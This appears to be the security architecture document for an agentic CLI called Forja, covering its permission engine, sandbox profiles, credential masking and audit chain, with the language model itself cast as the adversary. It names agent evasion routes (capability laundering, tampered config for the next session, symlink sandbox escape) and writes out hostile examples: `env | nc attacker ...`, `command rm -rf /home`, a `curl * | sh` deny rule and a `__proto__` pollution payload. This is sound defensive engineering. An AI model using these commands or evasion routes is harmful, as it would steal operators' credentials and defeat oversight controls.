# Forja Security Architecture

This document describes the security architecture of Forja's permission engine and sandbox. It is intended for operators evaluating Forja's threat model, contributors auditing the codebase, and reviewers tracing how a tool call is authorized and isolated.

The canonical specification lives in `docs/spec/` (PT-BR). This document is the English-language operational reference; when the two diverge, the spec wins.

---

## 1. Threat model

### 1.1 What Forja defends against

Forja is designed for one operator running an agentic CLI on a development machine. The trust anchor is the **operator**: a human who explicitly invoked the agent, can read its output, and can confirm or deny individual operations. The adversary is the **language model itself** plus any content the model reads from external sources (tool outputs, file contents, web fetches, MCP servers).

Concretely, Forja defends against:

1. **LLM-driven exfiltration.** A model that decides — under prompt injection or its own confused goals — to read credentials, post them to an external service, or otherwise smuggle them out of the operator's machine.
2. **Capability laundering.** A model that uses ostensibly safe tools (e.g., `cat`, `cd`, `grep`) in combination to achieve effects it could not request directly (e.g., `command rm -rf /home`).
3. **Tool-chain bypass.** A model that constructs commands designed to evade the static analysis the resolver performs — shell substitution, env-var injection, redirect tricks, encoding games.
4. **Persistent compromise across sessions.** A model that writes to operator config files (e.g., `~/.config/agent/permissions.yaml`) intending the next session boot under tampered rules.
5. **Audit tampering.** A model (or downstream attacker with DB write) that rewrites the audit chain to hide what it did.

### 1.2 What Forja does NOT defend against

Forja's audit is **tamper-evident**, not tamper-proof. The threat model explicitly excludes:

1. **Kernel-level adversary.** A user with root on the operator's machine can rewrite anything Forja stores. The hash chain detects the tampering on next verify; it cannot prevent it.
2. **Operator-hostile threat model.** Forja trusts the operator. A malicious operator running Forja in a multi-tenant environment to attack co-tenants is out of scope. Forja is single-operator software.
3. **Multi-tenant code execution as a service.** Forja's sandbox profiles (`ro`, `cwd-rw`, etc.) are sized for "agent edits source code in this directory" — they are not the right primitive for "run untrusted code from many parties on shared infrastructure".
4. **Side channels.** Timing, cache, power, memory residue, etc. The sandbox does not isolate against attacks below the syscall layer.
5. **Network egress at packet level.** Spec §6.5 reserves an nftables/pf enforcement plane as out-of-scope for v1. Today network-egress capabilities are **audit attributions**, not kernel-level packet filters. The `fetch_url` resolver's SSRF blocklist (`src/permissions/resolvers/fetch.ts`) gives kernel-adjacent defense for that tool only.
6. **Targeted supply-chain attack on the Forja codebase itself.** A compromised dependency in `package.json` is outside Forja's defenses. Operators must vet their build environment.

### 1.3 Honest limits in instrumentation

Audit covers DECISIONS (permission engine) and FAILURES (`failure_events`) and OUTCOMES (`outcome_signals`). It does **not** cover:

- The exact `bwrap` argv that ran (reconstructible deterministically from `(profile, cwd, home)` but not recorded per-call).
- File-level operations inside the sandbox (no strace/eBPF instrumentation).
- Mid-session sandbox loss for tool calls routed through the broker worker subprocess (the `bg/manager` site is covered via `sandbox.mid_session_loss`, but the broker bash handler runs in a worker without an IPC path for failure_events).
- The cryptographic identity of who sealed each chain entry (only available with RFC3161 TSA backend; worm-file and git-anchored backends rely on filesystem trust).

These gaps are documented in `docs/spec/AGENTIC_CLI.md §1` ("declare what was NOT measured") and surface in the audit chain via `failure_events` codes or absence of expected signals — never as silent success.

---

## 2. Core principles

Drawn from spec `docs/spec/AGENTIC_CLI.md §1`:

1. **Measure twice, cut once.** Every action with persistent side effect goes through prior verification. Every cut has a fallback.
2. **Reject early, reject loud.** Refuses carry the offending node type, command, or rule so operators can trace why. Silent passes are worse than loud failures.
3. **The whitelist is the policy surface.** Bash AST resolver decomposes commands against a closed set of node types and command names; anything outside is `Refuse`. Adding new shapes requires explicit code change (and tests).
4. **Reversible by design.** Every write goes through a checkpoint (`src/checkpoints/`). Operator `--undo` restores within seconds.
5. **Trace everything.** Every decision lands in the hash-chained `approvals_log`. Without reproducibility, the system does not exist.
6. **Defense in depth.** Multiple layers (resolver → policy → sandbox → audit) each independently catch a different class of failure. Single-layer failure does not compromise the system.

---

## 3. Permission engine

### 3.1 Pipeline overview

Every tool call passes through:

```
LLM emits tool_use
        │
        ▼
┌─────────────────────────┐
│ harness/invoke-tool     │  resolve tool from registry
└──────────┬──────────────┘
           ▼
┌─────────────────────────┐
│ engine.check(tool,args) │  ── the gate ──
└──────────┬──────────────┘
           │
           ├── 1. Resolver (per-tool, src/permissions/resolvers/)
           │       decompose args → Capability[] OR Refuse
           │       confidence ∈ {high, medium, low} OR conservative
           │
           ├── 2. Protected paths (HARDCODED, §11)
           │       /etc/shadow, ~/.ssh/*, /proc/self/environ, ...
           │       deny | escalate (escalate drops confidence → confirm)
           │
           ├── 3. Subagent envelope (§10.1/10.3)
           │       resolved caps must be subset of parent envelope
           │
           ├── 4. Policy rules
           │       deny rules → deny
           │       confirm rules → confirm
           │       allow rules → allow
           │
           ├── 5. Mode default
           │       strict → deny
           │       acceptEdits → allow (non-protected writes)
           │       bypass → allow (except §11 + §9.1.6 SSRF)
           │
           ├── 6. Risk score (§6.3)
           │       11 features, max 1.0, baseline-v2.0 weights
           │
           ├── 7. Sandbox plan (§6.5)
           │       select profile {ro|cwd-rw|cwd-rw-net|home-rw|host}
           │       refuse with `no_viable_sandbox` if no profile covers
           │
           ├── 8. Approval gate (§6.6)
           │       allow + (score >= threshold OR confidence != high)
           │       → upgrade to confirm
           │
           ▼
       Decision
   ┌──────┼──────┐
 allow  deny  confirm
   │      │       │
   ▼      ▼       ▼
 execute audit  TUI modal → execute|deny
```

Every step writes a `reason_chain` entry into `approvals_log`. The full chain — `protected-path`, `subagent-effective`, `static-rule`, `classifier`, `sandbox-plan`, `approval-gate` — is queryable via `agent permission replay <seq>`.

### 3.2 Resolvers

Resolvers decompose tool inputs into a typed list of `Capability` values plus a `confidence` rating. Located in `src/permissions/resolvers/`.

**`bash` resolver** (`bash.ts`, 2266 LOC, the most complex):
- Walks the tree-sitter-bash AST against a closed whitelist of node types (`SIMPLE_COMMAND`, `SIMPLE_PIPELINE`, `SIMPLE_SEQUENCE`, file redirects). Anything outside (`command_substitution`, `process_substitution`, `function_definition`, etc.) returns `Refuse`.
- COMMAND_TABLE maps recognized commands (~50: `ls`, `cat`, `git`, `npm`, `curl`, `python`, `node`, `tar`, `ssh`, `make`, `cargo`, ...) to per-command resolvers that emit appropriate capabilities.
- HARD_REFUSE_COMMANDS bypasses the table for fundamentally unsafe builtins: `eval`, `exec`, `source`, `.`, `trap`, `alias`, `shopt`, `set`, `unset`, `declare`, `export`, `typeset`, `readonly`, `local`, `dd`, `fdisk`, `parted`, `mkswap`, `shred`, `mkfs.*`, plus `command` and `builtin` (which would silently bypass the COMMAND_TABLE — slice 128 R4 P0-Launder-1).
- Per-command GTFOBins flags refused: `git -c key=value`, `git --git-dir`, `git --work-tree`, `find -execdir`, `tar --rmt-command`, `curl --upload-file`, `node --eval`, etc.
- Unicode hostile bytes (fullwidth `；`, ZWJ inside command names, bidi U+202E) refused at the literal-classifier layer (slice 98).
- Brace expansion is bounded: `MAX_BRACE_EXPANSIONS=1024` outputs, `MAX_BRACE_DEPTH=64` recursion (slice 129 R5 P1 stack defense).

**`fetch_url` resolver** (`fetch.ts`):
- Protocol whitelist: `http` and `https` only. Other schemes (`file`, `gopher`, `ftp`, `ws`) refuse at the protocol check.
- **SSRF blocklist** (slice 129 R5 P0, `checkSsrfBlocklist`): unconditional refuse for localhost, RFC1918 ranges (10/8, 172.16/12, 192.168/16), link-local 169.254/16 (covers AWS/GCP metadata 169.254.169.254), IPv6 loopback (`::1`) + link-local (`fe80::/10`) + ULA (`fc00::/7`), IPv4-mapped IPv6 in both dotted and hex forms (`::ffff:127.0.0.1` and `::ffff:7f00:1`), cloud metadata FQDNs (`metadata.google.internal`, `metadata.azure.com`), bare-name `metadata`. Resolver-level refuse short-circuits the engine — **operator policy cannot override it.**
- `wait_for` tool routes `port_open` + `http_response` through `fetch_url` permission, so the SSRF blocklist gates both surfaces.

**`read_file` / `write_file` / `edit_file` / `glob` / `grep` resolvers**:
- Emit `read-fs:<path>` / `write-fs:<path>` / `delete-fs:<path>` capabilities with absolute paths after `path.resolve(cwd, ...)`.
- The engine then runs each scope through the protected-paths classifier (`src/permissions/protected_paths.ts`) — hardcoded denies for `/etc/shadow`, `/etc/sudoers`, `~/.ssh/*`, `/proc/self/environ`, cloud metadata IP literals, etc. (spec §11).

Resolver returns:

```ts
type ResolverResult =
  | { kind: 'ok'; capabilities: Capability[]; confidence: 'high' | 'medium' | 'low' }
  | { kind: 'refuse'; reason: string }
  | { kind: 'conservative'; capabilities: Capability[] };  // forces confirm
```

`refuse` short-circuits the engine; the call never reaches policy evaluation. `conservative` allows the call to flow through policy but always lands on `confirm`.

### 3.3 Capability model

A `Capability` is a typed `{kind, scope}` pair:

| Kind | Scope example | Emitted by |
|---|---|---|
| `read-fs` | `/work/proj/src/foo.ts`, `~/.bashrc` | read_file, cat, grep, find |
| `write-fs` | `/work/proj/build/out.js` | write_file, mkdir, tee `>` |
| `delete-fs` | `/work/proj/node_modules` | rm, rmdir |
| `exec:shell` | `*` (sentinel — shell builtins) | bash |
| `exec:arbitrary` | `*` | unknown command, eval-shaped |
| `net-egress` | `api.github.com`, `*` | curl, wget, fetch_url, node `--inspect` |
| `net-ingress` | `*` | nc -l, node `--inspect-brk`, server bind |
| `git-write` | `/work/proj/.git` | git commit, git push, git reset |
| `secret-access` | `~/.aws`, `~/.ssh` | (engine-internal, used by sandbox planner) |
| `env-mutate` | `PATH`, `HOME` | (reserved, for env-modifying tools) |
| `agent-mutate` | `*` | (reserved) |
| `host-passthrough` | `*` | (required for `host` sandbox profile) |

Capabilities are the universal language for "what does this tool want to do". Resolvers emit them; policy rules match against them; the sandbox planner picks a profile that admits them; the audit row preserves them.

### 3.4 Policy layers

Policies stack from least-specific to most-specific:

```
default (built-in, src/permissions/types.ts)
  ↓
enterprise   /etc/agent/permissions.yaml (admin-controlled)
  ↓
user         ~/.config/agent/permissions.yaml
  ↓
project      .agent/permissions.yaml (cwd-local)
  ↓
session      CLI flags / runtime overrides
```

Each layer can:
- Add `allow` / `confirm` / `deny` rules per tool section.
- Set `defaults.mode` (`strict`, `acceptEdits`, `bypass`).
- Lock a section with `locked: true` — downstream layers cannot override.

Rules are **glob + prefix only**. No regex (spec §3 hard rule — too easy to write a regex that backtracks-exponentially or matches more than intended).

Example:

```yaml
defaults:
  mode: strict
tools:
  bash:
    allow:   ['ls', 'pwd', 'git status', 'git log *']
    confirm: ['git push *']
    deny:    ['rm -rf *', 'curl * | sh']
  read_file:
    allow_paths: ['**/*.ts', 'docs/**']
    deny_paths:  ['.env*', '**/secrets/**']
  fetch_url:
    allow_hosts: ['api.github.com', 'registry.npmjs.org']
    deny_hosts:  ['*.internal']
sandbox:
  required: true
  hostAllowed: false
```

`policy_hash` is `sha256:${canonicalHash(merged_policy)}` (with the `sha256:` prefix per audit row convention) — written into every audit row so a replay can detect whether the policy has drifted since the decision.

### 3.5 Risk score (§6.3)

Eleven features, each with a fixed weight in `RISK_SCORE_WEIGHTS` (`src/permissions/risk-score.ts`). Sum capped at 1.0. Pure + deterministic (no clock, no random — the score participates in the chain hash, so replays must reproduce identically).

| Feature | Weight | Fires when |
|---|---:|---|
| `capability_risk` | 0.40 | any cap kind in `{delete-fs, git-write, env-mutate, agent-mutate}` |
| `blocklist_command` | 0.30 | bash command contains a known-bad substring (`rm -rf`, `curl \| sh`, ...) |
| `confidence_low` | 0.30 | resolver returned `confidence: 'low'` |
| `untrusted_egress` | 0.25 | `net-egress:<host>` with host outside `trustedHosts` |
| `wildcard_scope` | 0.20 | any cap with `scope='*'` |
| `shell_complex` | 0.20 | bash with pipe/redirect/subshell |
| `engine_degraded` | 0.20 | engine state is `degraded` |
| `workspace_escape` | 0.15 | scope outside cwd (still inside home, or absolute outside) |
| `recent_errors` | 0.15 | ≥3 consecutive prior tool errors |
| `mcp_tool` | 0.10 | tool came from an MCP server |
| `confidence_medium` | 0.10 | resolver returned `confidence: 'medium'` |

**The score never produces `allow` on its own.** It can only upgrade an existing `allow` to `confirm`:

```
if decision.kind != 'allow':       return as-is (deny stays deny)
if score >= scoreConfirmThreshold: upgrade to confirm  (default threshold 0.40)
if confidence != 'high':           upgrade to confirm
otherwise:                          allow stays allow
```

Weights are documented as `baseline-v2.0`. Calibration plan (spec §6.3.2) collects 30 days of `(score, decision_humano, outcome)` triples (slice 131's `outcome_signals` materializes the third element) and derives `v2.1` via logistic regression. Step 1 of the plan — triple extraction — is in-tree as of slice 138 via `agent permission calibration-export` (spec §6.3.2.2, operator guide in `docs/AUDIT.md §2.2`); the regression itself stays offline.

### 3.6 Decision shape + audit emission

The engine returns a typed `Decision`:

```ts
type Decision =
  | { kind: 'allow';   approvalSeq?, sandboxProfile?, ttlExpiresAt?, source?, reason? }
  | { kind: 'deny';    approvalSeq?, sandboxProfile?, ttlExpiresAt?, source?, reason }
  | { kind: 'confirm'; approvalSeq?, sandboxProfile?, ttlExpiresAt?, source?, prompt, reason? }
```

`approvalSeq` is populated when the production SQLite audit sink wrote a row (`src/permissions/audit.ts`). Tests using the noop sink leave it undefined. The harness uses `approvalSeq` to link `approvals_log.seq` ↔ `tool_calls.id` via `approval_call_links` so replays can recover the raw args from `tool_calls.input` (the `approvals_log` row stores only `args_hash`).

`confirm` decisions are converted to a TUI modal by the harness. Without a `confirmFn` wired, `confirm` falls through as deny (the type is constructed so silently auto-allowing is impossible).

---

## 4. Sandbox

The sandbox enforces capability decisions at the OS level. The engine's static analysis is the planning surface; the sandbox is the enforcement surface.

### 4.1 Profile selection (§6.5)

Five profiles, ordered most-restrictive to least:

| Profile | Read | Write | Network |
|---|---|---|---|
| `ro` | full FS read (minus HIDE_PATHS) | nothing | blocked |
| `cwd-rw` | full FS read (minus HIDE_PATHS) | `/tmp` + cwd | blocked |
| `cwd-rw-net` | same as cwd-rw | same as cwd-rw | inherited (no kernel filter) |
| `home-rw` | full FS read (minus HIDE_PATHS) | `/tmp` + `$HOME` (HIDE_PATHS still masked) | blocked |
| `host` | full host filesystem | full host filesystem | full host network |

**Selection algorithm** (`selectSandboxProfile` in `sandbox-plan.ts`):

1. Build the set of capability KINDS the call requires (e.g., `{read-fs, write-fs, net-egress}`).
2. For each profile in order `[ro, cwd-rw, cwd-rw-net, home-rw, host]`, check if its allowed-kinds set covers the required kinds.
3. `host` requires TWO additional gates: operator passed `--sandbox-host` at the CLI AND the resolved capability set includes a `host-passthrough` capability.
4. If no candidates remain, refuse with `no_viable_sandbox`.
5. If `host` is the only candidate but other candidates exist, drop `host`.
6. Return the first (most-restrictive) candidate.

### 4.2 Linux: bwrap

`src/permissions/sandbox-runner.ts` synthesizes `bwrap` argv:

```
bwrap \
  --ro-bind / / \                   # entire FS readable
  --tmpfs /tmp \                     # fresh isolated /tmp
  --proc /proc \                     # procfs of the new namespace
  --dev /dev \                       # minimal /dev (random, null, urandom, zero, tty)
  --unshare-pid \                    # PID namespace (cannot see/signal host pids)
  --die-with-parent \                # kernel reaps child if agent dies
  [--unshare-net]                    # for ro / cwd-rw / home-rw
  [--bind <cwd> <cwd>]               # writable for cwd-rw / cwd-rw-net
  [--bind <home> <home>]             # writable for home-rw
  --tmpfs ~/.ssh                     # HIDE_PATHS_DIRS (one per credential dir)
  --tmpfs ~/.aws
  ...
  --ro-bind-try /dev/null ~/.netrc   # HIDE_PATHS_FILES (one per credential file)
  --ro-bind-try /dev/null ~/.docker/config.json
  ...
  --chdir <cwd> \                    # start in correct working dir
  -- \
  bash -c "<command>"
```

`--ro-bind / /` exposes the entire host filesystem read-only by default. HIDE_PATHS mounts apply AFTER and override (bwrap applies mounts in argv order; later wins). On `home-rw` profile, the `--bind $HOME $HOME` makes home writable, then the credential-path overlays restore read-only / empty semantics on the masked paths.

### 4.3 macOS: sandbox-exec / SBPL

`src/permissions/sandbox-runner-macos.ts` builds an Apple Sandbox Profile Language (SBPL) string and passes via `sandbox-exec -p`:

```scheme
(version 1)
(deny default)
(allow process-exec)
(allow process-fork)
(allow signal (target same-sandbox))
(allow sysctl-read)
(allow mach-lookup)
(allow file-read*)                          ; everything readable...
(allow file-write* (subpath "/tmp"))
(allow file-write* (subpath "/private/tmp"))
(allow file-write* (subpath "<cwd>"))        ; or <home> for home-rw
(allow network*)                             ; cwd-rw-net only
(deny file-read* (subpath "~/.ssh"))         ; ...except HIDE_PATHS
(deny file-write* (subpath "~/.ssh"))
(deny file-read* (literal "~/.netrc"))
(deny file-write* (literal "~/.netrc"))
...
```

SBPL evaluates top-to-bottom and **last-matching-rule wins** for each operation. The `(allow file-read*)` baseline is overridden by the `(deny file-read* (subpath "..."))` clauses appended at the end, including on `home-rw` where the `(allow file-write* (subpath home))` precedes the credential denies.

**`sandbox-exec` is flagged as deprecated by Apple.** The man page has carried the deprecation note since around macOS 10.15. The tool remains functional on current macOS but Apple offers no API-stability commitment; a future OS version could remove it without warning. Forja documents this as a known platform risk; alternative isolation (App Sandbox profiles, hypervisor-backed) is out of scope for v2.

### 4.4 Credential path masking (HIDE_PATHS)

`src/permissions/sandbox-hide-paths.ts` declares the canonical lists. Applied identically on Linux and macOS so behaviors don't diverge cross-platform.

**Directories** (mounted as empty tmpfs or denied via SBPL `subpath`):
- `.ssh` — SSH keys + known_hosts
- `.aws` — AWS credentials
- `.config/gcloud`, `.config/azure`, `.config/op` (1Password), `.config/sops` — cloud CLI creds
- `.config/agent`, `.config/forja` — Forja's own policy files (sandboxed process must not plant tampered config for next boot — slice 128 R4 P0-Sand-1/2)
- `.gnupg` — PGP keyring
- `.kube` — Kubernetes credentials
- `.terraform.d` — Terraform creds + credential cache
- `.ansible` — Ansible vault password file location
- `.local/share/forja` — Forja's audit DB (prevents direct sqlite tampering bypassing the hash chain)

**Files** (replaced with `/dev/null` bind-mount):
- `.netrc` — HTTP basic-auth credentials
- `.docker/config.json` — Docker registry auth
- `.npmrc` — NPM auth tokens
- `.pypirc` — PyPI auth
- `.git-credentials` — Git HTTP credentials store
- `.boto` — Legacy AWS Boto SDK credentials

Inside the sandbox, `cat ~/.ssh/id_rsa` returns `EOF` (empty tmpfs); `cat ~/.netrc` returns `EOF` (`/dev/null` bind). `ls ~/.ssh` returns an empty directory.

### 4.5 Capability map per profile

```
ro:          {read-fs, exec}
cwd-rw:      {read-fs, write-fs, delete-fs, exec, git-write}
cwd-rw-net:  {read-fs, write-fs, delete-fs, exec, git-write, net-egress}
home-rw:     {read-fs, write-fs, delete-fs, exec, git-write, secret-access}
host:        {read-fs, write-fs, delete-fs, exec, git-write, net-egress,
              net-ingress, secret-access, env-mutate, agent-mutate,
              host-passthrough}
```

`secret-access` requires `home-rw` or `host` because secrets live under `$HOME` — `home-rw` removes the HIDE_PATHS masking ONLY when the operator's policy explicitly authorized secret access (today that path is never auto-selected; the planner routes only calls carrying `secret-access` capability to `home-rw`, and no resolver emits that capability automatically — operators must annotate via policy).

`host-passthrough` is structurally required for the `host` profile, and the only resolver that emits it is a sentinel resolver wired explicitly for an opt-in "I really want to run unsandboxed" mode.

### 4.6 Wire-up

The sandbox profile selected at decision time rides on `Decision.sandboxProfile`. The harness threads it into `ToolContext`. Tools that spawn child processes call `maybeWrapSandboxArgv` (`src/permissions/sandbox-runner.ts`):

```ts
maybeWrapSandboxArgv({
  profile: 'cwd-rw',           // from Decision.sandboxProfile
  cwd: '/work/proj',
  home: '/home/lex',
  innerArgv: ['bash', '-c', '<command>'],
})
// → ['bwrap', '--ro-bind', '/', '/', '--tmpfs', '/tmp', ..., '--', 'bash', '-c', '<command>']
```

Three production call sites: `broker/handlers/bash.ts` (bash family), `bg/manager.ts` (background processes), `tools/builtin/grep.ts` (grep). When `profile` is `host` or undefined, or the sandbox tool isn't on PATH, the function returns `innerArgv.slice()` unchanged.

### 4.7 Availability + degradation

`detectSandboxAvailability` (`src/permissions/sandbox-availability.ts`) probes for `bwrap` (Linux) or `sandbox-exec` (macOS) at boot via `Bun.which`. The result threads into the engine's planner.

When unavailable:
- `policy.sandbox.required = true` → engine transitions to `refusing` (every check returns deny).
- `policy.sandbox.required = false` → engine transitions to `degraded` (`maybeWrapSandboxArgv` falls back to direct passthrough; every would-be `allow` becomes `confirm` per spec §6.5).
- `failure_events` row with `code: sandbox.tool_unavailable` lands at bootstrap (slice 130).

**Mid-session loss:** If the sandbox binary is removed BETWEEN boot and a spawn (rare but possible — operator uninstalled the package, container rebuild), `bg/manager.ts` probes per-spawn and emits `sandbox.mid_session_loss` the first time the loss is detected (suppressed for subsequent spawns until the tool reappears). The broker bash handler runs in a worker subprocess without IPC plumbing to `failure_events` — that gap is documented as out-of-scope for slice 130.

### 4.8 Limitations

1. **Symlinks in cwd.** `bwrap --bind <cwd> <cwd>` follows symlinks at the source. A symlink inside the cwd pointing outside the cwd (e.g., `node_modules → ~/.cache/npm`) bypasses the writable-only-cwd boundary in `cwd-rw` profile. Documented; operators advised to `realpath` the cwd before running.
2. **No nftables/pf egress filter.** `cwd-rw-net` inherits the parent network namespace; the only egress filter is the `fetch_url` resolver's SSRF blocklist, which protects only fetch_url + wait_for surfaces. Direct bash `curl http://10.0.0.1/` inside `cwd-rw-net` reaches the network.
3. **`/private/var/folders` not writable on macOS.** Apps using `NSTemporaryDirectory()` (Swift/Cocoa, some Python/Ruby tooling) fail at exec time. Slice 125 removed this writable mount because the path is shared across host apps and includes Keychain ephemeral state. Workaround: prefix `TMPDIR=/tmp`.
4. **`host` profile is a passthrough.** Operator-authorized `--sandbox-host` runs unsandboxed. Audit records `sandbox_profile=host`; the bwrap argv is `innerArgv` unchanged.
5. **No cgroup limits.** CPU/memory/pid-count are not constrained. Fork bombs are contained within the PID namespace (`--die-with-parent` kills children when the agent exits) but during the session they consume host CPU/RAM freely.
6. **HIDE_PATHS is `$HOME`-rooted only.** Secrets outside the home (`/etc/ssl/private/`, `/var/lib/docker/`, custom credential stores) are not in the list. Operators with non-standard credential locations must add custom deny rules in their policy.

---

## 5. Defense in depth

Forja's security model relies on **multiple independent layers**, each catching a different failure class:

| Layer | Defends against | Mechanism |
|---|---|---|
| Tool design | Underspecified actions | Each tool has a narrow contract; `read_file` cannot write, etc. |
| Resolver | Capability laundering | AST analysis + whitelist (no regex). HARD_REFUSE_COMMANDS. SSRF blocklist. |
| Protected paths | OS-level secrets exposure | Hardcoded denies in §11 — policy cannot override. |
| Subagent envelope | Privilege escalation via spawn | §10.1/10.3 — child caps must be subset of parent envelope. |
| Policy | Operator-declared boundaries | YAML rules, layered, locked. |
| Risk score + approval gate | Behaviors policy didn't anticipate | Score >= threshold OR confidence != high → confirm. |
| Sandbox planning | Privilege escalation by accident | Least-restrictive profile that covers caps. |
| Sandbox enforcement | Runtime FS/network/process isolation | bwrap (Linux) / sandbox-exec (macOS). HIDE_PATHS. |
| Env scrubbing | Credential exfiltration via env | `scrubEnv` strips `*_TOKEN`, `*_KEY`, `*_SECRET`, AWS_*, GIT_CONFIG_*, etc. |
| Audit chain | Tampering detection | SHA-256-chained `approvals_log`, sealed via worm-file/RFC3161/git-anchored/S3-object-lock. |
| Failure events | Silent degradation | `failure_events` table — sandbox loss, storage contention, etc. |
| Checkpoints | "Oh no" reversal | Every write step takes a git checkpoint. `--undo` restores. |

A single layer being defeated does not compromise the system. The bash resolver missing a GTFOBin still gets caught by the sandbox FS isolation. The sandbox getting bypassed (e.g., symlink trick) still leaves the call audited and reversible via checkpoint.

---

## 5.5 Privilege surfaces beyond the engine/sandbox triad

The engine + sandbox are the most visible defenses but they are not the whole perimeter. Twelve additional surfaces participate in the security model. Each is documented here so operators reviewing Forja can audit the full attack surface, not just the resolver pipeline.

### 5.5.1 cwd trust list

`src/trust/`. Spec slice 122 (R9 P0).

On first invocation in an unknown directory, Forja refuses to operate until the operator explicitly trusts the cwd. The trust list lives at `~/.config/agent/trusted_dirs` (newline-delimited absolute paths). The welcome flow prompts on initial run; refusal exits without touching anything.

Defends against `cd ~/cloned-malicious-repo && agent` — the project's `.agent/permissions.yaml`, `AGENTS.md`, and any tool definitions in that directory could carry attack payloads. The trust gate prevents Forja from loading them as authoritative until the operator confirms.

The trust file itself is in `HIDE_PATHS_DIRS` (`.config/agent`) so a sandboxed process cannot plant trust entries that take effect on the next session boot (slice 128 R4 P0-Sand-1).

### 5.5.2 Hooks

`src/hooks/`. Spec AGENTIC_CLI.md §10.

Operators define shell commands that run at lifecycle points: `SessionStart`, `PreToolUse`, `PostToolUse`, `Stop`, `UserPromptSubmit`. Hooks run **unsandboxed** (`bash` directly) because their purpose is exactly to interact with the host — kick CI, post to Slack, write a log entry, mint a token. They are a privileged surface **by operator design**.

Trust model: hooks are operator-authored files in `~/.config/agent/hooks/` or `.agent/hooks/`. The LLM cannot install new hooks (write to `.config/agent` is HIDE_PATHS-masked inside sandbox). Existing hook scripts are vetted by the operator at the point of creation.

`PreToolUse` hooks can BLOCK a tool call by exiting non-zero — orthogonal to the engine's deny. Operators use this for org policies the engine vocabulary doesn't cover (e.g., "no `npm install` of unscoped packages on Fridays"). Hook outputs land in `hook_runs` with stdout redacted per spec §1.

A failing hook is itself a security event: `hook_runs.exit_code != 0` for a `PreToolUse` event maps to a `tool_decided` denial, audit-loud.

### 5.5.3 Subagent IPC permission proxy

`src/subagents/ipc.ts`, `src/subagents/permission-bridge.ts`.

When a subagent (a `task`-spawned child process) hits a `confirm` decision, it cannot raise its own TUI modal — the parent owns the terminal. The permission-bridge proxies the ask via JSON IPC: child sends `{kind: "permission:ask", ...}` on stdout; parent's modal-manager handles it; parent sends `{kind: "permission:answer", ...}` on the child's stdin.

Trust boundary defenses:
- Every IPC line is parsed via `safeJsonParse` (slice 128 R4 P0-Inj-1) — proto-pollution attempt via `{"__proto__":{"isAdmin":true}}` planted in a malformed message gets stripped before reaching downstream `Object.assign({}, args)` patterns.
- The subagent's declared envelope (`effective_capabilities`) is computed by the parent at SPAWN time and persisted to `subagent_runs`. The child cannot widen it at runtime — every `engine.check` in the child enforces the persisted envelope (slice 95 R11 P0-3).
- Modal label uses parent-declared subagent name (from `agents/*.md` frontmatter), never a string the child supplied. Anti-spoof.
- Permission ask is rate-limited (slice 121 R5 R1 #14) so a misbehaving child cannot spam modals to fatigue the operator into clicking through.

### 5.5.4 MCP servers

External processes Forja connects to via `@modelcontextprotocol/sdk` (M3+ work). Each MCP server exposes tools that Forja routes through the same `engine.check` pipeline:

- MCP tools carry `isMcp: true` in the risk score (+0.10 adder per spec §6.3.1).
- MCP tool calls land in `tool_calls` like native tools.
- MCP server identity (URL + capability set + schema hash) lives in `mcp_servers`. Manifests are version-tracked in `mcp_manifest_history` for tamper-evidence.
- MCP server failures classify as `failure_events.classe='mcp'` with the catalog FAILURE_MODES.md §6.2–§6.8 reserves: `mcp.transport.broken`, `mcp.tool.slow`, `mcp.tool.validation`, `mcp.spec.violation`, `mcp.cap.exceeded`, `mcp.server.unknown`, `mcp.tool.dirty_workspace`. Slice 130 ships the classe + format; emit sites wire as the MCP subsystem stabilizes.

Threat model: MCP servers are TRUSTED to the same degree as bundled tools, BUT their inputs flow through resolvers and sandbox planning just like native tools. A malicious MCP server can lie about its tool's capabilities (the spec calls this `mcp.spec.violation`) but cannot bypass the engine — the worst case is a `classifier-low` confidence that forces confirm.

### 5.5.5 Plan mode

`--plan` CLI flag. Disables every write-shaped tool globally for the session:

- Engine returns `deny` for any decision whose capability set includes `write-fs`, `delete-fs`, `git-write`, `net-egress`, `net-ingress`, `env-mutate`, or `agent-mutate`.
- `enableCheckpoints: false` — no git probe per spawn (nothing to undo when no writes can land).

Used for "explore this codebase safely" workflows where the operator wants the model to read + reason but never modify. Audit rows in plan mode carry the deny reason `plan_mode_active` so replays can distinguish plan-deny from policy-deny.

### 5.5.6 `memory_write` modal

`src/tools/builtin/memory-write.ts`. Spec MEMORY.md §5.1.

Operator-facing memory writes (entries under `~/.config/agent/memory/`) require explicit confirmation via a dedicated modal flavor (`askMemoryWrite`). The modal renders the **exact bytes** about to land on disk — operator can spot prompt-injection attempts before approving.

Refused writes audit-log as `memory_events.action='refused'`. The modal-manager distinguishes 'no' from 'cancel' for telemetry — both deny the write but operators reading audit can tell explicit rejection from accidental dismissal.

### 5.5.7 Budget gates

Three independent budgets bound the session against runaway behavior:

- `maxCostUsd` — cumulative provider cost (sum of input/output token costs from the streamed `usage` events). Exceeded → exit reason `maxCostUsd` → status `exhausted`.
- `maxSteps` — number of harness-loop iterations (each step = one provider call + tool dispatch). Default 50; CLI override `--max-steps`.
- `maxWallClockMs` — total wall-clock time. CLI override `--max-wall-clock`.

Plus per-step bounds the global budgets can't see:
- `maxToolErrors` (default 5) — consecutive failing tool calls.
- `maxRepeatedToolHash` (default 8) — same (tool, args_hash) seen N times — degenerate-loop heuristic.
- `stepStalled` — provider went silent mid-stream past a timeout.

Budget-exhausted exits feed `failure_events` and `outcome_signals.session_aborted` (slice 131). Operators reading audit trends can tune budgets per workflow.

The budget gate is also a DoS defense: a prompt-injected LLM trying to "make N tool calls forever" hits `maxSteps` and stops; a runaway cost loop hits `maxCostUsd`.

### 5.5.8 Broker subsystem (JSON IPC)

`src/broker/`. Spec §13.7.

Bash family tools (`bash`, `bash_background`, `bash_output`, `bash_kill`) route through a broker that can run inline or spawn a worker subprocess. The boundary uses JSON IPC over stdin/stdout — same proto-pollution concern as the subagent IPC.

Slice 104 (R6 #42) hardened both wire boundaries with `safeJsonParse` that strips `__proto__`, `constructor`, `prototype` via a `JSON.parse` reviver. Without it, `{"__proto__":{"isAdmin":true}}` in a request line would pollute Object.prototype downstream via the `Object.assign({}, args)` patterns the handler uses.

The broker also calls `scrubEnv` on the worker's env so credentials don't leak through process spawn even if the bash command itself does `env | nc attacker ...`.

**Two modes**, selectable via `--broker <in-process|spawn>` at boot (default `in-process`):

| Property | `in-process` (default) | `spawn` |
|---|---|---|
| Where bash runs | Main process (same Bun runtime as the harness) | Fresh worker subprocess per `execute` call (`src/broker/worker.ts`) |
